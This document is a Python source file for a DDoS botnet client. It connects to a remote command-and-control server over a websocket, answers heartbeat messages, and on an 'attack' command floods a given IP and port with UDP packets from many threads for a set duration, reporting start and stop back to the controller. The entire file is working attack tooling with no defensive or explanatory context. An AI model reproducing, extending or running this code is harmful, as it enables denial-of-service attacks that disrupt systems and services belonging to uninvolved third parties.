import asyncio
import socket
import threading
import time
import websockets
from keep_alive import keep_alive


async def connect_and_listen():
    while True:
        try:
            uri = open('ip.txt', 'r').read().strip() if open(
                'ip.txt', 'r').read().strip() else None
            async with websockets.connect(uri) as websocket:
                await listen(websocket)
        except Exception as e:
            print("Connection failed. Retrying in 10 seconds...")
            await asyncio.sleep(5)


async def listen(websocket):
    while True:
        message = await websocket.recv()

        if message == "heartbeat":
            await websocket.send("doob")

        elif "attack" in message:
            cmmd, type, ip, port, duration, threads = message.split("/")
            print(f'Attacking {ip} with {type} for {duration} seconds')
            data = type, ip, int(port), int(duration), int(threads)
            await __ddos(data, websocket)

        else:
            await websocket.send("unknown")


def udp_flood(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * 1024
    timeout = time.time() + duration
    while time.time() < timeout:
        client.sendto(payload, (ip, port))


async def __ddos(data, websocket):
    type, ip, port, duration, threads = data
    if type == "udp":
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=udp_flood,
                                      args=(ip, port, duration))
            thread.start()
            thread_list.append(thread)

        await websocket.send("attack_started")

        for thread in thread_list:
            thread.join()

        await websocket.send("attack_stopped")


keep_alive()
asyncio.run(connect_and_listen())
